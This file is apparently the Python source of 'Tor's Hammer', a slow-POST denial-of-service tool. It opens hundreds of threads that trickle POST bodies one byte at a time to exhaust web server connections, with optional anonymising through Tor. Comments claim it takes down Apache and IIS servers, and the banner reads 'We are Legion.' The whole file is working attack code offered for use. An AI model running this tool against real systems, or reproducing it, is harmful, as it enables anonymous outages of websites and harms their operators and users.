#!/usr/bin/env python3

# this assumes you have the socks.py (http://phiral.net/socks.py) in the
# same directory and that you have tor running locally 
# on port 9150. run with 128 to 256 threads to be effective.
# kills apache 1.X with ~128, apache 2.X / IIS with ~256
# not effective on nginx

import time
import sys
import random
import getopt
import socks
import string
import ssl

from threading import Thread

global stop_now

stop_now = False

def get_useragent_list():
	with open('user-agents.txt') as f:
		return f.read().splitlines()

useragents = get_useragent_list()

class HttpPostThread(Thread):
    def __init__(self, thread_id, host, port, tor):
        Thread.__init__(self)
        self.thread_id = thread_id
        self.host = host
        self.port = port
        self.socket = socks.socksocket()
        self.transport = None
        self.tor = tor
        self.running = True

    def _send_http_post(self, payload_length=10000):
        global stop_now

        headers = ('POST / HTTP/1.1\r\n'
                   'Host: %s\r\n'
                   'User-Agent: %s\r\n'
                   'Connection: keep-alive\r\n'
                   'Keep-Alive: 900\r\n'
                   'Content-Length: %d\r\n'
                   'Content-Type: application/x-www-form-urlencoded\r\n\r\n' % (self.host, random.choice(useragents), payload_length))
        self.transport.send(headers.encode())
        print(f'[Thread #{self.thread_id}] Sent headers:\n{headers.strip()}\n')

        for i in range(0, payload_length - 1):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.ascii_letters + string.digits)
            print(f'[Thread #{self.thread_id}] Posting byte {i + 1} out of {payload_length}: ' + p)
            self.transport.send(p.encode())
            time.sleep(random.uniform(0.1, 3))

        # self.transport.close()

    def _connect(self):
        self.socket.connect((self.host, self.port))
        self.transport = self.socket if self.port != 443 else ssl.wrap_socket(self.socket)

    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:
                        self.socket.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
                        time.sleep(1)
                    self._connect()
                    print(f'Connected to {self.host}:{self.port}')
                    break
                except Exception as e:
                    print(f'Error connecting to {self.host}:{self.port}')
                    print(e)
                    time.sleep(1)
                    sys.exit()

            while self.running:
                try:
                    self._send_http_post()
                except Exception as e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print('Thread broken, restarting...')
                        self.socket = socks.socksocket()
                        break
                    print(f'Error: {e}')
                    time.sleep(1)
                    pass

def usage():
    print('./torshammer.py -t <target> [-r <threads> -p <port> -T -h]')
    print(' -t|--target <Hostname|IP>')
    print(' -r|--threads <Number of threads> Defaults to 256')
    print(' -p|--port <Web Server Port> Defaults to 80')
    print(' -T|--tor Enable anonymising through tor on 127.0.0.1:9150')
    print(' -h|--help Shows this help\n')
    print('Eg. ./torshammer.py -t 192.168.1.100 -r 256\n')

def main(argv):
    try:
        opts, args = getopt.getopt(argv, 'hTt:r:p:', ['help', 'tor', 'target=', 'threads=', 'port='])
    except getopt.GetoptError:
        usage()
        sys.exit(-1)

    global stop_now

    target = ''
    threads = 256
    tor = False
    port = 80

    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            sys.exit(0)
        if o in ('-T', '--tor'):
            tor = True
        elif o in ('-t', '--target'):
            target = a
        elif o in ('-r', '--threads'):
            threads = int(a)
        elif o in ('-p', '--port'):
            port = int(a)

    if target == '' or int(threads) <= 0:
        usage()
        sys.exit(-1)

    print('\n* Target: %s Port: %d' % (target, port))
    print('* Threads: %d Tor: %s' % (threads, tor))
    print('* Give 20 seconds without tor or 40 with before checking site\n')

    rthreads = []
    for i in range(threads):
        t = HttpPostThread(i, target, port, tor)
        rthreads.append(t)
        t.start()

    while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.is_alive()]
        except KeyboardInterrupt:
            print('\nShutting down threads...\n')
            for t in rthreads:
                stop_now = True
                t.running = False

if __name__ == '__main__':
    print('* Tor''s Hammer ')
    print('* Slow POST DoS Testing Tool')
    print('* entropy [at] phiral.net')
    print('* Anon-ymized via Tor')
    print('* We are Legion.')

    main(sys.argv[1:])
